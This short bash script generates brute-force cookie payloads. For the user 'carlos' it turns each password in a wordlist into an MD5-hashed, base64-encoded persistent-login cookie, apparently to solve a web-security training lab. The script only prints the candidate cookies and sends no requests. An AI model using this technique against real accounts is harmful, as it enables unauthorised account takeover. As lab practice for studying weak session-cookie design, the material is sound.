#!/bin/bash

# Define the username
USERNAME="carlos"

# Read the passwords from the file
PASSWORD_FILE="passwords.txt"

# Check if the passwords file exists
if [[ ! -f "$PASSWORD_FILE" ]]; then
    echo "Password file not found: $PASSWORD_FILE"
    exit 1
fi

# Read each password from the file and process it
while IFS= read -r PASSWORD; do
    # Compute MD5 hash of the password
    MD5_HASH=$(echo -n "$PASSWORD" | md5sum | awk '{print $1}')

    # Combine username and MD5 hashed password with ':'
    COMBINED_STRING="${USERNAME}:${MD5_HASH}"

    # Encode the combined string in Base64
    COOKIE=$(echo -n "$COMBINED_STRING" | base64)

    # Output the result
    echo "Original Password: $PASSWORD"
    echo "MD5 Hash: $MD5_HASH"
    echo "Cookie: $COOKIE"
    echo
done < "$PASSWORD_FILE"
